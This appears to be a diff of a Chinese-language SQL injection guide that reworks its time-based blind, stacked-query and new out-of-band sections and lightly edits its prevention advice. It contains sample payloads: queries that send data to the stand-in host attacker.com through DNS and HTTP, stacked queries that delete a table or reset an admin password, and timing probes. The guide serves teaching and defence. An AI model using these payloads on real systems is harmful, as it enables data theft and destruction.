@@ -17,19 +17,21 @@ temp
 
 #### 类型2 - "基于时间的盲注"(time-based blind)
 
-基于时间的盲注(Time-Based Blind SQL Injection Attacks)原理：利用能够"延时"的函数构造SQL语句 然后根据响应时长(响应时间间隔的数值大小)进行判断
+基于时间的盲注(Time-Based Blind SQL Injection Attacks)原理：使用能够"延时"的函数 构造SQL语句 然后根据响应时长(响应时间间隔的数值大小)进行判断
 
-* 无害验证payload - 验证SQLi漏洞是否存在
-  * 如对某个使用MySQL数据库的WEB系统测试时发送的请求含payload `(select*from(select(sleep(20)))a)` 得到response的时间为20秒
 * 攻击利用payload - 利用SQLi漏洞进行"数据获取"
-  * 方法1 利用"带外请求"获取数据
-    * MySQL 发出DNS请求 - `SELECT LOAD_FILE(CONCAT('\\\\foo.',(select version()),'.attacker.com\\abc'));`
+  * 方法1 利用"带外"方法 发出网络请求 以获取数据.  点击跳至[类型6 - "带外"(out-of-band)](#类型6---带外out-of-band)
   * 方法2 利用 "延时函数" 与 条件语法(Condition syntax) 得到True/False 逐个字符判断即可得到完整字符串值
-    * 参考[Time-Based Blind SQL Injection Attacks](http://www.sqlinjection.net/time-based/) 和 [Timing-based Blind SQL Attacks](https://hackernoon.com/timing-based-blind-sql-attacks-bd276dc618dd)
-      * MySQL"延时函数" `SLEEP(time)` `BENCHMARK(count, expr)`
-      * SQL Server"延时函数" `WAIT FOR DELAY 'hh:mm:ss'` `WAIT FOR TIME 'hh:mm:ss'`
-      * Postgres"延时函数" `pg_sleep(5)` 如`SELECT CASE WHEN secret = 'secret' THEN pg_sleep(5) ELSE NULL END FROM apps WHERE id = 1 ;`
+    * 利用条件:后端稳定(响应时间间隔稳定)
+    * "延时"函数
+      * MySQL "延时"函数 `SLEEP(time)` 如HTTP请求的payload为 `(select*from(select(sleep(20)))a)`得到response的时间为20秒
+      * MySQL "延时"函数 `BENCHMARK(count, expr)`
+      * SQL Server "延时"函数 `WAIT FOR DELAY 'hh:mm:ss'` 如`SELECT * FROM users WHERE id=1; IF SYSTEM_USER='sa' WAIT FOR DELAY '00:00:05'`
+      * SQL Server "延时"函数 `WAIT FOR TIME 'hh:mm:ss'`
+      * PostgresSQL "延时"函数 `pg_sleep(5)` 如`SELECT CASE WHEN secret = 'secret' THEN pg_sleep(5) ELSE NULL END FROM apps WHERE id = 1 ;`
       * ...
+
+参考 http://www.sqlinjection.net/time-based/
 
 #### 类型3 - "基于报错的SQL注入"(error-based)
 
@@ -43,12 +45,27 @@ temp
 
 堆叠查询(stacked queries)原理:通过分号分隔 实现执行多条SQL语句
 
-* 无害验证payload - 验证该漏洞是否存在
-  * 延迟时间 MySQL `SELECT * FROM products WHERE productid=1; select sleep(3)`
 * 攻击利用payload - 利用该漏洞"执行SQL语句" 操作数据
+  * 无害延时 MySQL `SELECT * FROM products WHERE productid=1; select sleep(3)`
   * 删除数据 MySQL `SELECT * FROM products WHERE productid=1; DELETE FROM products`
   * 修改数据 MySQL `SELECT * FROM products WHERE categoryid=1; UPDATE members SET password='pwd' WHERE username='admin'`
   * ...
+
+#### 类型6 - "带外"(out-of-band)
+
+"带外"(out-of-band) 原理:利用目标主机A的数据库的相关函数发出"含有数据的"网络请求到服务器B  服务器B可接收到数据.
+
+各种"盲注"的检测不稳定或无效时，常常借助"带外"实现"回显"(数据传输)
+
+* 攻击利用payload - 利用该漏洞"执行SQL语句" 操作数据
+  * 利用条件
+    * 1.具体数据库具体版本的具体函数 实测能够发出网络请求
+    * 2.目标主机A发出请求不被"网络限制"
+  * "带外"函数
+    * MySQL 发出DNS请求 - `SELECT LOAD_FILE(CONCAT('\\\\foo.',(select version()),'.attacker.com\\abc'));`
+    * Oracle 发出HTTP请求 - `SELECT * FROM products WHERE id=1||UTL_HTTP.request('http://test.attacker.com/'||(SELECT user FROM DUAL)) --`
+    * MSSQL 发出DNS请求 - `SELECT * FROM products WHERE id=1;EXEC master..xp_dirtree '\\test.attacker.com\' -- ` 扩展存储过程`xp_dirtree`用于指定的文件夹的所有文件夹的列表
+    * ...
 
 ### 漏洞危害
 
@@ -497,7 +514,7 @@ package main
 ```
 
 
-* 2. 存储过程
+* 2.存储过程
 
 存储过程的安全性高，和预编译语句相同
 
@@ -516,7 +533,7 @@ try {
 }
 ```
 
-* 3. 白名单输入验证(White List Input Validation) 
+* 3.白名单输入验证(White List Input Validation) 
 
 如`order by`和`limit`子句，无法使用"绑定变量"(bind variable)，就需要"白名单输入验证"
 
@@ -525,6 +542,6 @@ try {
 hibernate框架 防御排序注入(order by)原理:判断用户传递的值是否为实体类的属性.
 
 
-* 4. 数据库用户权限最小化(Least Privilege)
+* 4.数据库用户权限最小化(Least Privilege)
 
 参考OWASP [SQL_Injection_Prevention_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.md)
